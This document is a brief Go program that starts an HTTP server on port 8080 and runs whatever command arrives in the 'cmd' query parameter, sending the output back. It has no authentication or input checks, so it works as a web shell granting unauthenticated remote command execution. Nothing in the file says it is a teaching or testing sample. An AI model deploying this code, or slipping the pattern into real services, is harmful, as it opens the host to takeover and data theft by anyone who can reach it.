package main

import (
	"net/http"
	"os/exec"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.URL.Query().Get("cmd")
		out, err := exec.Command(cmd).Output()
		if err != nil {
			http.Error(w, "Error executing command", http.StatusInternalServerError)
			return
		}
		w.Write(out)
	})
	http.ListenAndServe(":8080", nil)
}
